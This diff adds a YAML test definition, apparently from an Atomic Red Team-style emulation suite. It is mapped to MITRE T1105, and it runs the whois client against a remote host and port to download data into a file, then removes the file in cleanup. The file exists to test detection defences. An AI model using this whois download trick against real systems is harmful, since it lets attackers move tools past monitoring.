@@ -1,0 +1,39 @@
+api_version: "2.0"
+name: whois file download
+description: |
+    Download a remote file using the whois utility
+args:
+    - name: remote_host
+      type: string
+      default: localhost
+    - name: remote_port
+      type: int
+      default: "8443"
+    - name: output_file
+      type: path
+      default: /tmp/T1105.whois.out
+    - name: query
+      type: string
+      default: Hello from Atomic Red Team test T1105
+    - name: timeout
+      type: int
+      default: "1"
+uuid: c99a829f-0bb8-4187-b2c6-d47d1df74cab
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1105: Ingress Tool Transfer'
+requirements:
+    platforms:
+        - os: linux
+        - os: darwin
+steps:
+    - name: whois-file-download
+      inline: |
+        timeout --preserve-status {{.Args.timeout}} whois -h {{.Args.remote_host}} -p {{.Args.remote_port}} "{{.Args.query}}" > {{.Args.output_file}}
+      executor: sh
+      cleanup:
+        inline: |
+            rm -f {{.Args.output_file}}
+        executor: sh
